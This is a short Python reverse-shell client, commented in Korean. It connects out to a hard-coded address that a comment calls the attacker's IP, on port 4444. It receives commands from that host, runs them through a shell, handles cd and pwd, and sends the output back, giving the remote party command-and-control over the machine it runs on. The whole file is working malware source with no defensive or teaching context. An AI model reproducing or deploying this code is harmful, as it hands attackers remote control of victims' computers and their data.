# client
import socket
import subprocess
import os


def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))
    return s


def connect_cnc(s):
    while True:
        cwd = os.getcwd()
        command = s.recv(65535).decode().lower()
        if command == "exit":
            s.close()
            break
        elif command == "pwd":
            s.send(cwd.encode("utf-8"))
            continue

        try:
            if command.startswith("cd"):
                os.chdir(command[3:].replace("\n", ""))
                command = ""
                cwd = os.getcwd()
                s.send(cwd.encode("euc-kr"))
                continue
        except Exception as e:
            s.send(str(e).encode("euc-kr", "ignore"))

        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)


if __name__ == "__main__":
    ip = "192.168.0.5"  # 연결할 공격자의 아이피 주소
    port = 4444
    s = set_sock(ip, port)
    connect_cnc(s)
